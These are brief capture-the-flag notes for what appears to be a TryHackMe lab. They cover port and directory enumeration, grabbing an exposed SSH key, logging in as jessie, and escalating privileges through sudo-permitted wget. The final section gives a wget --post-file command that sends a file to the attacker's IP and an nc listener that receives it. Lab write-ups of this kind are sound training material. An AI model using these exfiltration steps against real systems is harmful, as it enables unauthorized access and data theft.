# Write up 

## Help [[Tryhackme/Wgl_ctf/help]]

## Links
- [[WebApp]]
- [[Pentesting]]


## Keys words
- Dirb
- Ssh
- wget privilege escalation


## Info
- Code source home page `Jessie`

## Enumeration

### Nmap 
- Shh
- http 80

### Dirb
- /sitemap
- /sitemap/.ssh

## Exploit
Take ssh key and login with the command `ssh -i id_rsa jessie@ip`

## Privilege escaltion
- sudo -l => wget no password

### Command
`wget --post-file=path_file <yourIP>`
`nc -lnvp 80` for getting the file
